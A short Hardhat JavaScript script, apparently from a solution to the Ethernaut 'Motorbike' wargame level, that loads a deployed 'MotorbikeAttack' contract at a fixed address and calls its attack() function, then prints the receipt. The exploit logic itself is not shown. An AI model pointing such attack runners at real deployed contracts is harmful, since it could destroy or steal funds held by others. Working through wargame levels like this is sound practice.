const { ethers } = require("hardhat");

const ATTACKER_ADDRESS = "0xC5234aebA607abc9F7A7d99D244aE983DB342183";

async function main() {
    const motorbikeAttacker = await ethers.getContractAt("MotorbikeAttack", ATTACKER_ADDRESS);

    // Execute the attack.
    const transferTx = await motorbikeAttacker.attack({gasLimit: 1000000});
    const attackReceipt = await transferTx.wait();
    console.log("attackReceipt: ", attackReceipt);


}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});